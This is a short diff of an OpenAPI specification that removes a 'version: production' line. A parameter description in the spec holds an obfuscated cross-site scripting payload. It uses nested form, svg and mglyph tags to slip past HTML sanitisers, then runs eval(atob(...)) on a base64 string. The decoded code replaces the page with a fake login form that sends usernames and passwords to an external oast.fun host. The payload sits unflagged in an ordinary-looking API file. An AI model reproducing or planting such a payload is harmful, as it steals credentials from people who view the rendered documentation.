@@ -28,7 +28,6 @@ paths:
       parameters:
         - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IAp2YXIgYT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7CmEuYWN0aW9uPSJodHRwOi8vb21tc2d4bWl0eXN2Z254c3psZWNjZWEzdW1lbTdqM2sxLm9hc3QuZnVuIjsKYS5tZXRob2Q9J1BPU1QnOwphLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyAKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsiJw==' onerror='eval(atob(this.id))'>"></form>
-  version: production
           format: int64
           in: path
           name: id
